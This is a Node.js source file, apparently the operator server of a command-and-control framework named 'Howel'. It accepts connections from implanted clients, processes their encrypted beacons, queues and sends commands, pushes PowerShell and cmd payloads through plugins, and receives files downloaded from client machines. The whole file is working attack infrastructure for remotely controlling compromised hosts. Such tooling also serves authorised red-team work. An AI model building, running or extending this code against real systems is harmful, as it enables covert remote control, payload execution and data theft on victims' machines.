/**
 *                                  ,--,                                               
 *                               ,---.'|                                               
 *            .---.    ,----..   |   | :       ,---,.          ,----..        ,----,   
 *           /. ./|   /   /   \  :   : |     ,'  .' |         /   /   \     .'   .' \  
 *       .--'.  ' ;  /   .     : |   ' :   ,---.'   |        |   :     :  ,----,'    | 
 *      /__./ \ : | .   /   ;.  \;   ; '   |   |   .'        .   |  ;. /  |    :  .  ; 
 *  .--'.  '   \' ..   ;   /  ` ;'   | |__ :   :  :          .   ; /--`   ;    |.'  /  
 * /___/ \ |    ' ';   |  ; \ ; ||   | :.'|:   |  |-,        ;   | ;      `----'/  ;   
 * ;   \  \;      :|   :  | ; | ''   :    ;|   :  ;/|        |   : |        /  ;  /    
 *  \   ;  `      |.   |  ' ' ' :|   |  ./ |   |   .'        .   | '___    ;  /  /-,   
 *   .   \    .\  ;'   ;  \; /  |;   : ;   '   :  '          '   ; : .'|  /  /  /.`|   
 *    \   \   ' \ | \   \  ',  / |   ,/    |   |  |          '   | '/  :./__;      :   
 *     :   '  |--"   ;   :    /  '---'     |   :  \          |   :    / |   :    .'    
 *      \   \ ;       \   \ .'             |   | ,'           \   \ .'  ;   | .'       
 *       '---"         `---`               `----'              `---`    `---'          
 *    AUTHOR: Russell Benzing                             
 *    VERSION: 0.2.0
 *    LICENSE: GPL-3.0
 */
//  ------------------------------------- VARIABLES -------------------------------------
const { createServer } = require('node:net');

const { encryptData, decryptData, getSessionId } = require('./utils/encdec');
const { getUptime, displayCommandOptions, getHowel, getStartup, displayActivePlugins } = require('./utils/helpers');
const { log, logInfo, logError, logSuccess, createLogStream } = require('./utils/logging');
const { startInputListener } = require('./utils/readline');
const { handleResponse, handleBeacon, handleDownloadResponse } = require('./utils/handlers');
const { setClientActive, showClient, showActiveClients, executeQueuedCommands } = require('./utils/clients');
const { loadAndRegisterPlugins } = require('./utils/plugins');

const config = require('./config/configLoader');

const activeClients = new Map();
const queuedCommands = new Map();
const loadedPlugins = new Map();
const serverCommands = ['help', 'client', 'clients', 'exit', 'plugins', 'set', 'uptime', 'clear'];
const clientCommands = [];

const startTime = Date.now(); // script start time

let rl = null; // console readline instance
let server = null; // server sockets instance
let logStream = null; // log stream instance

let activeClientSessionID = null; // active client session ID

/**
 * Handles the command input for the server
 * @param {*} command 
 * @param {*} properties 
 * @param {*} logStream
 */
const handleServerCommand = async (command, properties, logStream) => {
    try {
        if (clientCommands.includes(command.split(' ')[0]) ||
            serverCommands.includes(command.split(' ')[0])) {
            let handledByPlugin = false;
            for (const [pluginName, pluginModule] of loadedPlugins.entries()) {
                if (pluginModule.commands && pluginModule.commands[command]) {
                    const pluginCommand = pluginModule.commands[command];
                    if (pluginModule.type === 'server') {
                        pluginCommand.handler(properties, {process, rl, console});
                    } else if (pluginModule.type === 'client') {
                        switch (pluginCommand.method) {
                            case 'payload-ps':
                                await sendClientCommand('ps', [
                                    pluginCommand.handler(properties)
                                ]);
                                break;
                            case 'payload-cmd':
                                await sendClientCommand('cmd', [
                                    pluginCommand.handler(properties)
                                ]);
                                break;
                            case 'execute':
                                command = pluginCommand.handler(properties);
                                await sendClientCommand(command, properties);
                                break;
                            default:
                        }
                    }
                    handledByPlugin = true;
                    break;
                }
            }
            if (!handledByPlugin) {
                switch (command) {
                    case 'clear':
                        console.clear();
                        await rl.write("\u001b[0J\u001b[1J\u001b[2J\u001b[0;0H\u001b[0;0W", { ctrl: true, name: 'l'});
                        break;
                    case 'uptime':
                        log(getUptime(startTime), undefined, logStream);
                        break;
                    case 'set':
                        activeClientSessionID = setClientActive(activeClientSessionID, properties[0], logStream);
                        break;
                    case 'plugins':
                        displayActivePlugins(loadedPlugins, logStream);
                        break;
                    case 'help':
                        displayCommandOptions(loadedPlugins, logStream);
                        break;
                    case 'client':
                        showClient(activeClientSessionID, activeClients, logStream);
                        break;
                    case 'clients':
                        showActiveClients(activeClients, logStream);
                        break;
                    case 'exit':
                        closeServer();
                        break;
                    default:
                        logInfo('Invalid command. Type "help" to see available commands.', logStream);
                }
            }
        }
        await rl.prompt();
    } catch (error) {
        logError(`Exception: ${error.message}`, logStream);
    }
};

/**
 * Sends a command to a client
 * @param {*} client
 * @param {*} command 
 * @param {*} args 
 */
const sendCommandToClient = async (client, command, args) => {
    if (!client) {
        throw new Error('Invalid client.'); 
    } else if (!command) {
        throw new Error('Missing command.')
    }
    if (client && client.active) {
        await executeClientCommand(client, [command, ...args].join(' '));
    } else {
        const queuedCommandsForSession = queuedCommands.get(client.sessionId) || [];
        queuedCommandsForSession.push({ command, args });
        logInfo(`Queued command for client ${client.sessionId}. Command: ${command} ${args}`, logStream);
        queuedCommands.set(client.sessionId, queuedCommandsForSession);
    }
};

/**
 * Execute a client command
 * @param {*} client 
 * @param {*} command 
 */
const executeClientCommand = async (client, command) => {
    const socket = client.socket;
    const sessionId = client.sessionId;
    let cipher = 'aes-256-gcm';
    if (client.type === 'ps') {
        cipher = 'aes-256-cbc';
    }
    const payload = await encryptData(command, sessionId, cipher);
    if (payload) {
        return new Promise((resolve) => {
            if (socket.write(payload) === true) {
                // wait
            } else {
                socket.once("drain", resolve(true));
            }
        });
    } else {
        throw new Error("Payload invalid.");
    }
};

/**
 * Sends the client command
 * @param {*} command 
 * @param {*} args 
 * @returns 
 */
const sendClientCommand = async (command, args) => {
    const sessionId = activeClientSessionID || null;
    if (sessionId) {
        const client = activeClients.get(sessionId);
        if (!client) {
            logError(`Invalid client session ID or client not found.`, logStream);
            return;
        }
        // Send command to client and wait for response
        await sendCommandToClient(client, command, args);
    } else {
        logInfo(`You must first set an active client sessionID.`, logStream);
    }
};

/**
 * Closes the server connection
 */
const closeServer = () => {
    for (const [sessionId, client] of activeClients) {
        client.socket.destroy();
        logSuccess(`Client connection ${sessionId} has been closed.`, logStream);
    }
    activeClientSessionID = null;
    server.close(() => {
        logInfo('\nServer connection closed', logStream);
        if (rl) {
            rl.close();
            logSuccess(`Console has been closed.`, logStream);
        }
        if (logStream) {
            // stop log stream
            logStream.end();
            logSuccess(`LogStream has been closed.`, logStream);
        }
        process.exit(0);
    });
};

/**
 * Creates the server connection for net.Socket
 */
server = createServer((socket) => {
    const ipAddress = socket.address().address.replace("::ffff:","");
    const sessionId = getSessionId(ipAddress)
    let client = activeClients.get(sessionId);
    if (!client) {
        client = {
            sessionId: sessionId,
            socket: socket,
            address: ipAddress,
            lastSeen: new Date(),
            active: true,
            buffer: '',
            waiting: false,
            version: null,
            type: null,
            platform: null, 
            arch: null, 
            osver: null, 
            hostname: null
        };
        activeClients.set(sessionId, client);
    } else {
        client.active = true;
        client.socket = socket;
        client.lastSeen = (new Date()).getDate();
    }
    socket.on('data', async (payload) => {
        try {
            if (payload.length >= config.data.chunk_size || payload.includes('--FIN--')) {
                // chunk mode
                client.waiting = true;
                client.buffer += payload;
                if (client.buffer.includes('--FIN--')) {
                    const bufferChunks = client.buffer.replace('--FIN--', '');
                    const decrypted = await decryptData(bufferChunks.toString('utf8'), client.sessionId);
                    const parsed = JSON.parse(decrypted);
                    const response = parsed.response;
                    if (response.download) {
                        await handleDownloadResponse(response, logStream);
                    } else {
                        handleResponse(response, logStream);
                    }
                    client.waiting = false;
                    client.buffer = '';
                }
            } else {
                // non-chunk mode
                const decrypted = await decryptData(payload.toString('utf8'), client.sessionId);
                const parsed = JSON.parse(decrypted);
                const response = parsed.response;
                if (response.beacon) {
                    handleBeacon(response, client, logStream);
                    await executeQueuedCommands(client, queuedCommands, logStream);
                } else if (response.download) {
                    await handleDownloadResponse(response, client.sessionId, logStream);
                } else if (response.error) {
                    logError(response.error, logStream);
                } else {
                    handleResponse(response, logStream);
                }
            }
        } catch(err) {
            logError(err.message, logStream);
        }
    });
    socket.on('end', () => {
        logInfo(`\nClient ${sessionId} disconnected. IP: ${client.address}`, logStream);
        if (client) {
            client.lastSeen = new Date();
            client.active = false;
        }
    });
    socket.on('error', (err) => {
        logError(`\nClient ${client.sessionId} threw an error: ${err.message}. IP: ${client.address}`, logStream);
        if (client) {
            client.active = false;
        }
    });
});

server.on('error', (err) => {
    logError(`\nServer threw an error: ${err.message}`, logStream);
    closeServer();
});

server.listen(config.server.port, config.server.host, async () => {
    // create log
    logStream = await createLogStream();

    // startup logo and info
    getHowel(logStream);
    getStartup(startTime, logStream);

    // register plugins
    await loadAndRegisterPlugins(clientCommands, serverCommands, loadedPlugins, logStream);

    // start input listener
    rl = await startInputListener();
    rl.on('line', async (input) => {
        try {
            const [command, ...args] = input.trim()
                .split(/ +(?=(?:(?:[^"]*"){2})*[^"]*$)/); // Use regex to split by any whitespace
            if (!command) {
                rl.prompt();
                return;
            }
            if (config.logging.enabled && logStream) {
                logStream.write(`Enter command > ${command}\n`);
            }
            // handle the command
            await handleServerCommand(command, args, logStream);
        } catch (error) {
            logError(`Error: ${error.message}`, logStream);
        }
    });
    rl.prompt();
});

const shutdown = () => {
    logInfo('Server is shutting down...', logStream);
    server.close(() => {
        logInfo('Server has shut down gracefully', logStream);
        closeServer();
        process.exit(0);
    });
};

process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);